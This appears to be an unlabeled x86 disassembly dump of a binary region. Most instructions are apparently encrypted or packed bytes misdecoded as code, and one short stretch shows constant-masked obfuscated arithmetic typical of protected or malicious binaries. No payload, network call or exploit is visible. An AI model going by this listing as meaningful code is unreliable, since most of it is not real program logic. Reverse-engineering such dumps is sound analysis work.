  410305:	fninit 
  410307:	clc    
  410308:	jle    0x41036d
  41030a:	dec    ebp
  41030b:	inc    ebx
  41030c:	dec    esi
  41030d:	pop    edx
  41030e:	mov    WORD PTR [eax+0x65],es
  410311:	das    
  410312:	xchg   esp,eax
  410313:	fs mov ch,0x8c
  410316:	sub    edx,esp
  410318:	fsubr  DWORD PTR [esi]
  41031a:	sahf   
  41031b:	inc    esp
  41031c:	test   ebx,esp
  41031e:	test   eax,0x3ac28584
  410323:	inc    eax
  410324:	mov    WORD PTR [ecx],fs
  410326:	(bad)  
  410327:	std    
  410328:	je     0x4102f8
  41032a:	ins    DWORD PTR es:[edi],dx
  41032b:	stos   DWORD PTR es:[edi],eax
  41032c:	das    
  41032d:	ja     0x410358
  41032f:	fst    st(6)
  410331:	into   
  410332:	iret   
  410333:	fldcw  WORD PTR [esp+edx*2]
  410336:	push   ecx
  410337:	xor    al,0xd5
  410339:	leave  
  41033a:	ja     0x410347
  41033c:	jl     0x410373
  41033e:	xor    BYTE PTR [eax],ah
  410340:	push   cs
  410341:	or     DWORD PTR [ebx-0x21],ebp
  410344:	push   0xd38559fe
  410349:	iret   
  41034a:	div    BYTE PTR [ebx+0x43]
  41034d:	pop    eax
  41034e:	mov    al,0x40
  410350:	cmp    BYTE PTR [edx],ah
  410352:	mov    ebx,0xaa8edd1f
  410357:	test   eax,0x55efee25
  41035c:	jmp    0x410314
  41035e:	mov    bh,0x36
  410360:	pop    eax
  410361:	xchg   DWORD PTR [esp+edx*1],ecx
  410364:	pusha  
  410365:	fsub   st,st(2)
  410367:	ret    0x939f
  41036a:	mul    esi
  41036c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41036d:	mov    esi,0x9c5cae15
  410372:	fld    TBYTE PTR [ebp-0x4f]
  410375:	mov    DWORD PTR [esi+edi*2+0x69],0x37ce72ce
  41037d:	clc    
  41037e:	xor    DWORD PTR [ecx],ecx
  410380:	mov    cl,0x1f
  410382:	jnp    0x410383
  410384:	push   es
  410385:	test   BYTE PTR [ebx+0x2b],bh
  410388:	xor    al,0xd1
  41038a:	rcl    DWORD PTR [ebx+0x50],1
  41038d:	xlat   BYTE PTR ds:[ebx]
  41038e:	jmp    0x410338
  410390:	cmp    BYTE PTR [ecx+0x2b],dh
  410393:	aaa    
  410394:	clc    
  410395:	and    ch,BYTE PTR [ecx-0x4d4c4a78]
  41039b:	out    0xe4,eax
  41039d:	inc    ebp
  41039e:	adc    esp,esi
  4103a0:	pop    edx
  4103a1:	ins    DWORD PTR es:[edi],dx
  4103a2:	test   DWORD PTR [edi+ebp*8],ecx
  4103a5:	mov    ch,dh
  4103a7:	sbb    al,BYTE PTR [ebx]
  4103a9:	int3   
  4103aa:	cmp    BYTE PTR [esi+0x3f],dh
  4103ad:	dec    edi
  4103ae:	inc    esp
  4103af:	icebp  
  4103b0:	sbb    eax,0xd908a386
  4103b5:	sbb    DWORD PTR [ebp-0x72c755b9],ebx
  4103bb:	dec    edx
  4103bc:	and    esp,0xdbd93f43
  4103c2:	loope  0x4103f0
  4103c4:	sub    al,0x93
  4103c6:	add    bh,al
  4103c8:	ret    0xfae9
  4103cb:	jmp    0x410351
  4103cd:	jbe    0x4103b8
  4103cf:	std    
  4103d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103d1:	xchg   BYTE PTR [esi],ch
  4103d3:	out    0x77,al
  4103d5:	jge    0x4103bf
  4103d7:	inc    edx
  4103d8:	mov    ebp,0xf80e3469
  4103dd:	dec    esp
  4103de:	inc    edx
  4103df:	xchg   edi,eax
  4103e0:	fcmovnu st,st(0)
  4103e2:	xchg   ebx,eax
  4103e3:	mov    esp,0xe573e5f4
  4103e8:	leave  
  4103e9:	nop
  4103ea:	mov    edx,0x5142575a
  4103ef:	sub    eax,0x3e32614c
  4103f4:	int    0x15
  4103f6:	cmp    DWORD PTR [ebx+0x11ec0d2f],0x77
  4103fd:	inc    edx
  4103fe:	ins    BYTE PTR es:[edi],dx
  4103ff:	shl    DWORD PTR [ecx-0x66],1
  410402:	xor    BYTE PTR [eax],bh
  410404:	push   es
  410405:	push   ebx
  410406:	cmp    BYTE PTR [ebx+0x2101fc5d],dh
  41040c:	dec    edx
  41040d:	aam    0xf5
  41040f:	mov    DWORD PTR [eax+0x76],esp
  410412:	fistp  QWORD PTR ds:0x37aa21ba
  410418:	pop    eax
  410419:	and    ebp,DWORD PTR [esi-0x49]
  41041c:	mov    ebx,0xb6d97621
  410421:	mov    al,ds:0xdc675c9
  410426:	jb     0x410492
  410428:	scas   al,BYTE PTR es:[edi]
  410429:	sub    eax,DWORD PTR [ebp-0x1c71f1]
  41042f:	sar    edi,1
  410431:	ins    BYTE PTR es:[edi],dx
  410432:	jecxz  0x4103df
  410434:	push   es
  410435:	sti    
  410436:	cmc    
  410437:	mov    DWORD PTR [ecx+ebp*1+0x2a],edx
  41043b:	cdq    
  41043c:	inc    ebp
  41043d:	enter  0x1e94,0x3
  410441:	jmp    0x41043f
  410443:	push   esi
  410444:	dec    ebx
  410445:	lock cwde 
  410447:	push   ebx
  410448:	rol    DWORD PTR [ebx],1
  41044a:	(bad)  
  41044b:	in     al,dx
  41044c:	mov    ds:0x6029f83d,al
  410451:	or     edx,edi
  410453:	lods   eax,DWORD PTR ds:[esi]
  410454:	mov    ebx,0x9537af3e
  410459:	adc    ch,BYTE PTR [esi-0x78803736]
  41045f:	aad    0x35
  410461:	leave  
  410462:	mov    bh,0x2e
  410464:	dec    ebp
  410465:	pop    ecx
  410466:	or     edi,esp
  410468:	(bad)
  41046b:	push   es
  41046c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41046d:	sub    BYTE PTR [esi],cl
  41046f:	pop    ds
  410470:	sub    eax,0x30162da5
  410475:	sbb    eax,DWORD PTR [edi-0x78]
  410478:	imul   edi
  41047a:	lahf   
  41047b:	mov    DWORD PTR [eax],esi
  41047d:	xchg   ebp,eax
  41047e:	mov    edi,0xb637478e
  410483:	idiv   al
  410485:	jmp    0x39ff2318
  41048a:	jnp    0x410507
  41048c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41048d:	retf   0x2030
  410490:	xor    dh,BYTE PTR [edi+eiz*4+0x57]
  410494:	in     al,0x7e
  410496:	jae    0x410421
  410498:	sbb    DWORD PTR [edi-0x4c1bef37],esp
  41049e:	pop    ds
  41049f:	inc    esi
  4104a0:	mov    edi,0x98abc8af
  4104a5:	jno    0x410473
  4104a7:	and    al,0xd9
  4104a9:	in     eax,0xfa
  4104ab:	(bad)  
  4104ac:	cdq    
  4104ad:	mov    ebp,0x95a8c63c
  4104b2:	mov    cl,0x9b
  4104b4:	fistp  QWORD PTR [eax-0x6e]
  4104b7:	inc    ebp
  4104b8:	or     BYTE PTR [ecx+0x2335243],0xad
  4104bf:	outs   dx,BYTE PTR ds:[esi]
  4104c0:	add    al,0x66
  4104c2:	adc    esi,DWORD PTR [ebp-0x65]
  4104c5:	xor    BYTE PTR [eax],ch
  4104c7:	mov    al,0x7c
  4104c9:	sti    
  4104ca:	test   BYTE PTR [edx+0x66],bh
  4104cd:	adc    BYTE PTR ds:0x5eb522e7,ah
  4104d3:	(bad)
  4104d6:	sbb    edx,ecx
  4104d8:	and    esi,edx
  4104da:	ss or  al,0x4e
  4104dd:	repnz mov ebp,0x36fc4845
  4104e3:	inc    eax
  4104e4:	fwait
  4104e5:	out    dx,eax
  4104e6:	fs push edx
  4104e8:	in     al,dx
  4104e9:	or     ch,BYTE PTR [esi]
  4104eb:	setne  BYTE PTR [edi-0x46]
  4104ef:	shl    ah,1
  4104f1:	inc    esp
  4104f2:	loop   0x410558
  4104f4:	fild   WORD PTR [ebp+0x53]
  4104f7:	mov    ebx,0x1d67a7fc
  4104fc:	scas   eax,DWORD PTR es:[edi]
  4104fd:	arpl   WORD PTR [edi+0x34a6260c],cx
  410503:	pop    esp
  410504:	add    BYTE PTR [esi+0x74],dl
  410507:	inc    DWORD PTR ds:0x60bbb2c7
  41050d:	(bad)  
  41050e:	jo     0x4104b2
  410510:	jg     0x41051b
  410512:	sbb    esi,DWORD PTR [eax]
  410514:	sub    DWORD PTR [esp+ebx*1+0x79e19fd3],ebp
  41051b:	sub    DWORD PTR [eax],ebp
  41051d:	mov    bl,0x2e
  41051f:	(bad)  
  410521:	adc    BYTE PTR [edi+0x1ed38921],dl
  410527:	pop    esi
  410528:	pusha  
  410529:	xchg   esp,eax
  41052a:	ins    BYTE PTR es:[edi],dx
  41052b:	repnz cmp DWORD PTR [esi+0x2dda9c0d],esi
  410532:	ds or  ah,0x9b
  410536:	sub    DWORD PTR [edx],0xa0ad1157
  41053c:	(bad)  
  41053d:	leave  
  41053e:	push   0x359f3ed4
  410543:	push   cs
  410544:	dec    edx
  410545:	leave  
  410546:	sahf   
  410547:	stos   BYTE PTR es:[edi],al
  410548:	fptan  
  41054a:	push   esi
  41054b:	fbstp  TBYTE PTR [esi]
  41054d:	pop    es
  41054e:	cmp    al,0xe8
  410550:	xor    al,0xef
  410552:	mov    ecx,0xe06cdaf0
  410557:	adc    BYTE PTR [ecx+0x64bdea53],bh
  41055d:	add    esp,edi
  41055f:	scas   al,BYTE PTR es:[edi]
  410560:	lock xor DWORD PTR [edi-0x30],edx
  410564:	mov    fs,WORD PTR [ecx-0x46]
  410567:	jne    0x41056b
  410569:	xchg   BYTE PTR [ecx+0xfc085f6],al
  41056f:	test   BYTE PTR [esi-0x76ffffec],cl
  410575:	jne    0x410553
  410577:	jmp    0x41096b
  41057c:	in     eax,0xe6
  41057e:	outs   dx,DWORD PTR ds:[esi]
  41057f:	pop    ebp
  410580:	outs   dx,DWORD PTR ds:[esi]
  410581:	jne    0x410578
  410583:	data16 hlt 
  410585:	test   ebx,eax
  410587:	pushf  
  410588:	lahf   
  410589:	sbb    eax,ebp
  41058b:	or     al,0xa
  41058d:	mov    edi,0x7d497070
  410592:	jo     0x410604
  410594:	sub    ch,BYTE PTR [edi-0x39c3b306]
  41059a:	mov    al,ds:0x44012a74
  41059f:	push   cs
  4105a0:	loopne 0x410545
  4105a2:	jnp    0x4105fe
  4105a4:	imul   DWORD PTR [edi-0x64]
  4105a7:	(bad)
  4105aa:	in     eax,0xd7
  4105ac:	in     eax,0x39
  4105ae:	inc    esp
  4105af:	retf   0x3cd1
  4105b2:	(bad)  
  4105b3:	(bad)  [edi+0x5043a294]
  4105b9:	ds mov ecx,0x478b53c0
  4105bf:	icebp  
  4105c0:	lods   eax,DWORD PTR ds:[esi]
  4105c1:	dec    esi
  4105c2:	pushf  
  4105c3:	rcr    DWORD PTR [eax*8+0x42f6825e],0x82
  4105cb:	arpl   WORD PTR [ecx],bp
  4105cd:	les    ebp,FWORD PTR [ebp-0x4]
  4105d0:	and    dh,BYTE PTR [esi+0x1f467408]
  4105d6:	mov    esi,0x21583a99
  4105db:	pop    esi
  4105dc:	push   ebp
  4105dd:	daa    
  4105de:	sub    BYTE PTR [edx+esi*2-0x40958321],bh
  4105e5:	fnstsw WORD PTR [ebp+0x5f]
  4105e8:	enter  0x796d,0x1e
  4105ec:	jmp    0xeaca:0xc86d20f5
  4105f3:	jo     0x4105c1
  4105f5:	adc    al,0xd7
  4105f7:	je     0x410625
  4105f9:	jb     0x410615
  4105fb:	jl     0x410612
  4105fd:	enter  0xae78,0x38
  410601:	xacquire xchg BYTE PTR [ebx],bh
  410604:	jbe    0x410597
  410606:	mov    ds:0xdd411162,al
  41060b:	xchg   edi,eax
  41060c:	outs   dx,DWORD PTR ds:[esi]
  41060d:	arpl   WORD PTR [esi-0x34],dx
  410610:	adc    ecx,DWORD PTR [edi]
  410612:	mov    BYTE PTR [edi],dh
  410614:	mov    eax,0x60134504
  410619:	leave  
  41061a:	mov    ah,0x3
  41061c:	pusha  
  41061d:	mov    cl,0x45
  41061f:	mov    dl,0xaf
  410621:	and    dl,dl
  410623:	and    dl,BYTE PTR [eax+0x24]
  410626:	nop
  410627:	inc    ebp
  410628:	in     eax,0x82
  41062a:	xor    BYTE PTR [eax+edi*2+0x2a7ace50],bh
  410631:	das    
  410632:	pop    ebx
  410634:	sub    esi,edx
  410636:	jmp    0x4810:0xd9ba8e88
  41063d:	sbb    al,0x25
  41063f:	xchg   DWORD PTR [edi+0x4c9d5af3],ebx
  410645:	bound  edi,QWORD PTR [esi-0x6c]
  410648:	sbb    esp,DWORD PTR [edi-0x296ac4f4]
  41064e:	xor    DWORD PTR [edi],eax
  410650:	imul   eax,DWORD PTR [esi+edi*1],0x64
  410654:	pop    ebp
  410655:	or     DWORD PTR [esi-0x4110f19f],ecx
  41065b:	mov    ds:0xf33b867e,al
  410660:	cmp    BYTE PTR [edi-0x7f],ch
  410663:	jp     0x41060c
  410665:	mov    eax,ds:0xcd15e77b
  41066a:	retf   0xdc0b
  41066d:	inc    esi
  41066e:	mov    ds:0x76bf87a5,eax
  410673:	or     esp,DWORD PTR [edx+0x20]
  410676:	in     eax,0x52
  410678:	add    ch,BYTE PTR [ebp+ecx*4-0x75]
  41067c:	mov    bl,0xa8
  41067e:	test   eax,0x57910cdb
  410683:	jne    0x41066c
  410685:	dec    esp
  410686:	data16 aas 
  410688:	ror    BYTE PTR [esi-0x3a],cl
  41068b:	cld    
  41068c:	push   0x4d
  41068e:	push   ecx
  41068f:	and    eax,0xada9c5f6
  410694:	and    al,bh
  410696:	imul   ecx,DWORD PTR [ebx],0x521254c7
  41069c:	xchg   edi,eax
  41069d:	pusha  
  41069e:	fimul  WORD PTR [esi+ebx*1]
  4106a1:	pop    ss
  4106a2:	xchg   ebp,eax
  4106a3:	pop    ebx
  4106a4:	xchg   edx,eax
  4106a5:	jmp    0x402961aa
  4106aa:	jp     0x4106d8
  4106ac:	or     al,0xd5
  4106ae:	(bad)  ds:0x4672568d
  4106b4:	scas   eax,DWORD PTR es:[edi]
  4106b5:	dec    edx
  4106b6:	push   esp
  4106b7:	stc    
  4106b8:	pop    eax
  4106b9:	sbb    ebp,DWORD PTR ds:[esi]
  4106bc:	jns    0xfb135e57
  4106c2:	xor    DWORD PTR ds:0x80ade986,ebp
  4106c8:	add    dh,BYTE PTR [esi-0x67]
  4106cb:	xor    ecx,DWORD PTR [eax]
  4106cd:	cmp    BYTE PTR [ebp+eiz*2-0x4b],cl
  4106d1:	jmp    0xc64e:0x84ca4e06
  4106d8:	mov    dh,0x34
  4106da:	xchg   ebx,eax
  4106db:	mov    dl,0xe5
  4106dd:	ja     0x410677
  4106df:	dec    edi
  4106e0:	ja     0x4106e0
  4106e2:	test   eax,0xfaada304
  4106e7:	xor    bl,BYTE PTR [ebp-0x80]
  4106ea:	in     eax,0xe1
  4106ec:	jg     0x41076c
  4106ee:	sbb    al,0xe6
  4106f0:	mov    edx,0xd655c5dc
  4106f5:	shr    BYTE PTR [ecx-0x6cb01960],1
  4106fb:	inc    ebx
  4106fc:	push   es
  4106fd:	test   eax,0x816a2580
  410702:	add    eax,0xfb320229
  410707:	rcl    DWORD PTR [ebx],0xb3
  41070a:	fcom   DWORD PTR [eax+0x2dcb9c06]
  410710:	lea    edx,[edi+0x465582f6]
  410716:	out    0xd6,eax
  410718:	cmp    bl,al
  41071a:	xchg   ebp,eax
  41071b:	cli    
  41071c:	call   0x6796518d
  410721:	js     0x88dc086c
  410727:	push   ebp
  410728:	loope  0x4106d8
  41072a:	sbb    al,0x6f
  41072c:	dec    edi
  41072d:	ja     0x410753
  41072f:	pop    ecx
  410730:	(bad)
  410734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410735:	in     al,0x41
  410737:	push   eax
  410738:	adc    ebx,eax
  41073a:	pop    ecx
  41073b:	jmp    0x4106c3
  41073d:	in     eax,dx
  41073e:	lea    edx,[edx-0x51]
  410741:	push   edi
  410742:	mov    ecx,0x9cbf712f
  410747:	mov    eax,ds:0xeeb9a7b6
  41074c:	fstp   TBYTE PTR ds:0xc9da3358
  410752:	ins    BYTE PTR es:[edi],dx
  410753:	push   ebx
  410754:	dec    edx
  410755:	and    DWORD PTR [ecx-0x18],esi
  410758:	mov    ecx,0x8d929068
  41075d:	les    edx,FWORD PTR [ebx+edx*8+0x59]
  410761:	lods   eax,DWORD PTR ds:[esi]
  410762:	and    ebx,DWORD PTR [esi-0x6f463bda]
  410768:	and    DWORD PTR [bx-0x4ace],0xffffffb3
  41076e:	sbb    eax,0xe7c933a5
  410773:	out    dx,eax
  410774:	xchg   esp,eax
  410775:	out    dx,eax
  410776:	das    
  410777:	loope  0x410751
  410779:	ins    DWORD PTR es:[edi],dx
  41077a:	repz sti 
  41077c:	std    
  41077d:	inc    esi
  41077e:	mov    ebp,0xf73bcebe
  410783:	mov    ah,0xcd
  410785:	in     eax,dx
  410786:	jl     0x410736
  410788:	mov    edi,0x69e0e445
  41078d:	(bad)  
  41078f:	test   al,0xb2
  410791:	mov    BYTE PTR [ecx],dh
  410793:	and    eax,0x2310f14a
  410798:	push   eax
  410799:	ss (bad) 
  41079c:	cmc    
  41079d:	rol    bl,cl
  41079f:	xor    al,0x34
  4107a1:	pop    edx
  4107a2:	and    edx,DWORD PTR cs:[ecx]
  4107a5:	xchg   ebx,eax
  4107a6:	push   cs
  4107a7:	scas   eax,DWORD PTR es:[edi]
  4107a8:	xchg   ecx,eax
  4107a9:	pop    esp
  4107aa:	push   ecx
  4107ab:	adc    DWORD PTR [ecx+ebp*2+0x2395fadf],0xffffff89
  4107b3:	dec    ecx
  4107b4:	xchg   BYTE PTR [edi+0x29115fb6],cl
  4107ba:	xchg   eax,edi
  4107bc:	mov    ah,0x36
  4107be:	ret    
  4107bf:	xchg   esp,eax
  4107c0:	mov    DWORD PTR [esi+0x4e],ebp
  4107c3:	into   
  4107c4:	and    DWORD PTR [eax],eax
  4107c6:	enter  0x7390,0x5d
  4107ca:	leave  
  4107cb:	mov    esp,0x56e2780f
  4107d0:	dec    esp
  4107d1:	repz div ebp
  4107d4:	mov    ds:0xe585d334,eax
  4107d9:	rcl    DWORD PTR [ebp-0x5bbafcf6],1
  4107df:	fcom   QWORD PTR [edx-0x1d553720]
  4107e5:	nop
  4107e6:	lds    ebp,FWORD PTR [edx]
  4107e8:	das    
  4107e9:	sbb    BYTE PTR [eax-0x6f],dh
  4107ec:	hlt    
  4107ed:	jmp    0x3530:0xe4b1b6e7
  4107f4:	adc    DWORD PTR [esi-0x12],ebp
  4107f7:	or     DWORD PTR [ecx],ebp
  4107f9:	sub    DWORD PTR [edi],0x19
  4107fc:	cwde   
  4107fd:	push   0x1f6877d6
  410802:	xchg   ebp,eax
  410803:	(bad)  
  410804:	je     0x4107f4
  410806:	mov    BYTE PTR [ecx+0x1e],dh
  410809:	push   ebp
  41080a:	sub    DWORD PTR ds:0xd6c2ae52,edi
  410810:	xchg   ebp,eax
  410811:	icebp  
  410812:	xchg   edi,eax
  410813:	inc    edi
  410814:	dec    esp
  410815:	dec    esi
  410816:	ja     0x410859
  410818:	and    bl,BYTE PTR [edi-0xc]
  41081b:	sbb    eax,0x4f8810c6
  410820:	lock mov ah,0x7b
  410823:	(bad)  
  410824:	jecxz  0x4107bc
  410826:	popf   
  410827:	fist   WORD PTR [edx+eax*8+0x2a]
  41082b:	jp     0x410836
  41082d:	gs jecxz 0x4108a7
  410830:	or     BYTE PTR [esi],0x7e
  410833:	push   0xffffffc9
  410835:	mov    bh,0x81
  410837:	mov    edx,0xdcbd1d18
  41083c:	je     0x41083d
  41083e:	xchg   edi,eax
  41083f:	sbb    al,0x30
  410841:	stos   BYTE PTR es:[edi],al
  410842:	pop    edx
  410843:	mov    ch,0x4
  410845:	ret    0xa488
  410848:	sti    
  410849:	sub    esi,DWORD PTR [eax]
  41084b:	les    eax,FWORD PTR [edi-0x391a1363]
  410851:	sar    BYTE PTR [eax-0x5f3e1626],0xf2
  410858:	test   DWORD PTR [ebp+0x23],ebx
  41085b:	pop    ss
  41085c:	es or  ebp,eax
  41085f:	mov    ds:0xa85f110,al
  410864:	das    
  410865:	sbb    bl,0xce
  410868:	sti    
  410869:	inc    ecx
  41086a:	fs aam 0x97
  41086d:	loopne 0x410847
  41086f:	in     al,0x68
  410871:	test   DWORD PTR [edx],0xd74d126e
  410877:	jge    0x4108a3
  410879:	xchg   ebp,eax
  41087a:	inc    esp
  41087b:	loopne 0x410828
  41087d:	sub    al,0x54
  41087f:	add    esi,DWORD PTR [ebp+0x1]
  410882:	xchg   esi,eax
  410883:	xor    eax,DWORD PTR cs:[esp+esi*1]
  410887:	popf   
  410888:	inc    ecx
  410889:	jo     0x41089c
  41088b:	xor    eax,0xd9d9361a
  410890:	sub    al,0x4
  410892:	mov    ds:0x63ac6264,al
  410897:	inc    ebp
  410898:	or     ch,BYTE PTR [esi+0x69]
  41089b:	mul    BYTE PTR [esi-0x28]
  41089e:	int    0x34
  4108a0:	mov    dl,0x71
  4108a2:	and    al,0x90
  4108a4:	das    
  4108a5:	dec    ebx
  4108a6:	and    DWORD PTR [ebp-0x9],ecx
  4108a9:	popa   
  4108aa:	push   0x37341784
  4108af:	adc    ah,0xe2
  4108b2:	push   cs
  4108b3:	lds    esp,FWORD PTR [edx+0x7a]
  4108b6:	xlat   BYTE PTR ds:[ebx]
  4108b7:	sub    al,0x77
  4108b9:	pop    es
  4108ba:	pop    ss
  4108bb:	add    BYTE PTR [ebx+ebx*4-0x498fc0b0],0xc3
  4108c3:	(bad)  
  4108c4:	ror    DWORD PTR [edx+eiz*8],0x68
  4108c8:	inc    edi
  4108c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108ca:	sub    eax,0x4c20261b
  4108cf:	ins    BYTE PTR es:[edi],dx
  4108d0:	jns    0x990ad851
  4108d6:	xchg   edx,eax
  4108d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108d8:	push   edi
  4108d9:	dec    DWORD PTR [ebx-0x53fd6f36]
  4108df:	sub    DWORD PTR [ebx-0x13],0xffffffcb
  4108e3:	mov    al,ds:0x2c4e864d
  4108e8:	in     al,0x28
  4108ea:	outs   dx,DWORD PTR ds:[esi]
  4108eb:	sbb    DWORD PTR [ebp-0x185302d1],edi
  4108f1:	outs   dx,DWORD PTR ds:[esi]
  4108f2:	push   0x96ec1718
  4108f7:	push   ebp
  4108f8:	sbb    eax,0x8b5a0a89
  4108fd:	mov    dl,BYTE PTR [ebp+0x35]
  410900:	push   ss
  410901:	adc    DWORD PTR [ecx],ebx
  410903:	nop
  410904:	in     eax,0x66
  410906:	xor    al,0x49
  410908:	repnz adc DWORD PTR [edx],ebx
  41090b:	call   0x269eaa32
  410910:	in     eax,dx
  410911:	bnd jb 0x410939
  410914:	xor    DWORD PTR [edi],esi
  410916:	shr    DWORD PTR cs:[ecx+0x28576c19],1
  41091d:	aad    0xdd
  41091f:	lods   al,BYTE PTR ds:[esi]
  410920:	cs enter 0x2415,0xe5
  410925:	out    dx,al
  410926:	jno    0x4108d6
  410928:	aaa    
  410929:	in     eax,dx
  41092a:	xlat   BYTE PTR ds:[ebx]
  41092b:	dec    esp
  41092c:	jo     0x4108e2
  41092e:	cli    
  41092f:	outs   dx,BYTE PTR ds:[esi]
  410930:	pop    ebp
  410931:	or     eax,0x234f08f
  410936:	fsub   st(0),st
  410938:	fdivrp st(3),st
  41093a:	repnz pop ss
  41093c:	mov    edi,0x6b27744f
  410941:	xor    ecx,eax
  410943:	inc    edi
  410944:	adc    al,0x20
  410946:	pop    edi
  410947:	adc    DWORD PTR [esi+0xc],esi
  41094a:	jno    0x4108cf
  41094c:	addr16 (bad) 
  41094e:	test   DWORD PTR [edx-0x48],0x3594057e
  410955:	scas   al,BYTE PTR es:[edi]
  410956:	and    al,0x82
  410958:	cmp    eax,0xedb4d499
  41095d:	clc    
  41095e:	fs mov esi,0xd48198e8
  410964:	xchg   esp,eax
  410965:	je     0x41090e
  410967:	stc    
  410968:	lock dec esi
  41096a:	sub    al,0x6a
  41096c:	or     ebx,DWORD PTR [ecx+0x6a]
  41096f:	add    eax,0xcb875b49
  410974:	sub    ebx,ecx
  410976:	xchg   ebx,ecx
  410978:	dec    ecx
  410979:	mov    eax,DWORD PTR [ebp-0x1c]
  41097c:	imul   eax,ecx
  41097f:	sub    esp,eax
  410981:	mov    DWORD PTR [ebp-0x24],esp
  410984:	mov    eax,DWORD PTR [ebp-0x4]
  410987:	mov    ecx,0x7510855
  41098c:	xor    eax,ecx
  41098e:	mov    edx,0x32729c
  410993:	add    eax,edx
  410995:	mov    DWORD PTR [ebp+0x8],eax
  410998:	mov    eax,DWORD PTR [ebp-0x18]
  41099b:	xor    eax,ecx
  41099d:	add    eax,edx
  41099f:	mov    edx,DWORD PTR [ebp+0x14]
  4109a2:	imul   eax,DWORD PTR [edx]
  4109a5:	mov    edx,DWORD PTR [ebp-0x4]
  4109a8:	xor    edx,ecx
  4109aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4109ad:	lea    ecx,[edx+ecx*1+0x32729c]
  4109b4:	cmp    ecx,eax
  4109b6:	je     0x4119fd
  4109bc:	mov    edi,DWORD PTR [ebp-0x18]
  4109bf:	mov    eax,DWORD PTR [ebp+0x8]
  4109c2:	mov    edx,DWORD PTR [ebp+0x14]
  4109c5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4109c9:	mov    ecx,0x7510855
  4109ce:	xor    edx,edx
  4109d0:	xor    edi,ecx
  4109d2:	mov    esi,0x32729c
  4109d7:	add    edi,esi
  4109d9:	div    edi
  4109db:	mov    edx,DWORD PTR [ebp-0x4]
  4109de:	xor    edx,ecx
  4109e0:	lea    eax,[edx+eax*1+0x32729c]
  4109e7:	mov    edx,DWORD PTR [ebp+0x8]
  4109ea:	mov    edi,DWORD PTR [ebp-0x24]
  4109ed:	mov    DWORD PTR [edi+edx*4],eax
  4109f0:	mov    eax,DWORD PTR [ebp-0x18]
  4109f3:	jmp    0x410de7
  4109f8:	ja     0x41099d
  4109fa:	mov    ecx,0x7175496f
  4109ff:	mov    ds:0xd6da6ce9,eax
  410a04:	xchg   ebp,eax
  410a05:	jbe    0x410a56
  410a07:	das    
  410a08:	arpl   WORD PTR [eax+esi*2+0x707d4970],di
  410a0f:	jo     0x410a7e
  410a11:	inc    edi
  410a12:	inc    eax
  410a13:	inc    ecx
  410a14:	out    dx,al
  410a15:	test   DWORD PTR [ebx],ecx
  410a17:	sbb    dh,BYTE PTR [ebp+ebx*8-0x54]
  410a1b:	loope  0x410a92
  410a1d:	dec    ebx
  410a1e:	cdq    
  410a1f:	or     DWORD PTR [edx+0xd34c5c8],0xffffffcc
  410a26:	mov    edi,es
  410a28:	mov    ds:0x1d550eaf,eax
  410a2d:	and    ebx,DWORD PTR [ebx+ecx*4+0x1b60f4fa]
  410a34:	int    0x3f
  410a36:	xlat   BYTE PTR ds:[ebx]
  410a37:	adc    ah,0xf8
  410a3a:	jmp    0x436f:0xc3c6862a
  410a41:	xor    al,ah
  410a43:	loopne 0x410a30
  410a45:	fcmovbe st,st(6)
  410a47:	mov    ah,0xe6
  410a49:	cld    
  410a4a:	call   FWORD PTR [ecx-0x2e]
  410a4d:	sbb    esp,DWORD PTR [esi+esi*4]
  410a50:	mov    ch,0x78
  410a52:	retf   0xd8e7
  410a55:	ret    
  410a56:	push   ecx
  410a57:	dec    edx
  410a58:	pop    ds
  410a59:	push   ebx
  410a5a:	ins    DWORD PTR es:[edi],dx
  410a5b:	xchg   ebp,ebp
  410a5d:	lahf   
  410a5e:	(bad)  
  410a5f:	mov    eax,0x57f602ee
  410a64:	mov    DWORD PTR [edx-0x51],ecx
  410a67:	push   ecx
  410a68:	mov    eax,0x476e706d
  410a6d:	popa   
  410a6e:	retf   
  410a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a70:	shl    ah,1
  410a72:	adc    DWORD PTR [ebp-0x32],edi
  410a75:	mov    ch,0x5d
  410a77:	dec    edx
  410a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a79:	xor    eax,0xf52e77d3
  410a7e:	mov    edi,0xeb1fc243
  410a83:	sub    eax,0xebff0b35
  410a88:	push   edx
  410a89:	sbb    BYTE PTR [ebp+eiz*4-0x31],ch
  410a8d:	mov    ebp,0x37274ac3
  410a92:	loop   0x410a9f
  410a94:	xor    dl,BYTE PTR [edx-0x57]
  410a97:	xchg   ebx,eax
  410a98:	retf   0xb3bc
  410a9b:	and    al,0x5b
  410a9d:	gs inc edx
  410a9f:	sbb    BYTE PTR [ebx+0x73351833],cl
  410aa5:	test   BYTE PTR [edx],dl
  410aa7:	mov    eax,ds:0x8063146e
  410aac:	pop    es
  410aad:	fwait
  410aae:	mov    ch,0x4d
  410ab0:	pop    ebx
  410ab1:	dec    ecx
  410ab2:	cwde   
  410ab3:	mov    ecx,0xb606ccba
  410ab8:	mov    dh,0x84
  410aba:	inc    edi
  410abb:	mov    edi,0xe70d4155
  410ac0:	jae    0x410ae9
  410ac2:	and    ch,0x5d
  410ac5:	mov    DWORD PTR [edx+0x2a],ecx
  410ac8:	sti    
  410ac9:	sbb    ch,ah
  410acb:	mov    dl,0xd3
  410acd:	mov    edx,0x8789a4f0
  410ad2:	pop    ss
  410ad3:	(bad)  [esi-0x1ffc3fe5]
  410ad9:	pop    es
  410ada:	rol    DWORD PTR [edx+0x4],cl
  410add:	rep outs dx,DWORD PTR gs:[esi]
  410ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ae1:	imul   esi,eax,0x99794477
  410ae7:	addr16 hlt 
  410ae9:	cmp    cl,BYTE PTR [esi-0x24298e33]
  410aef:	mov    ah,0x20
  410af1:	lods   al,BYTE PTR ds:[esi]
  410af2:	xor    bh,BYTE PTR [edi+0x7906333a]
  410af8:	dec    esi
  410af9:	dec    edi
